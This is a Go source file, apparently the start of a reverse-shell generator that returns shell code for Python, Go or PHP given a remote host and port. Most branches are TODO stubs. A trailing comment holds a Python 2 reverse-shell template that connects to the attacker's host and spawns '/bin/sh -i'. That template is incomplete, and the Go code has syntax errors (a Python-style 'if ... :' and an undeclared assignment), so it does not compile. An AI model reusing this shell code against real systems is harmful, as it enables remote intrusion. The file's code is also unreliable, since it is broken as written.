package shells

import (
	"fmt"
	"os"
)


/**
	Error handler
**/

type ShellError struct {
	msg string
	err string
}

func (e *ShellError) Error() string {
	return fmt.Sprintf("%s - %s", e.msg, e.err)
}

/*
	ReShellGen() -> returns -> (string, error)
	lang (str): Language -> python, go (compiled), php, more to add...
		possible extra param to add: oneliner?
			some re shells can be oneliners like python

	rhost: Remote host -> The ip the shell will connect to
	rport: Remote port -> The port the shell will connect to

*/
func ReShellGen(lang string, rhost string, rport int) (string, error){

	// todo: lang.toLower() - set lang to lowercase letters?
	if lang == "python2" {
		// Python reverse shell
		return "TODO: Python2", &ShellError{}
	} else if lang == "go" {
		// Go reverse shell
		return "TODO: Go", &ShellError{}
	} else if lang == "php" {
		// php reverse shell
		return "TODO: PHP", &ShellError{}
	} else {
		return "", &ShellError{"Unkown language", lang}
	}

	return "Ehm", &ShellError{}
}

func loadTemplate(lang string) (error) { // return what?
	file, err := os.Open(("templates/shell_" + lang))
	if err != nil:
		return err

	contents = []
}

/** TEMPLATES: **
Python(2) - Linux (exec: "bin/sh"):
import socket, subprocess, os
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rhost, rport))
p=subprocess.call(["/bin/sh", "-i"])

Python(3) - TODO:
*insert shell template here :D*


****************/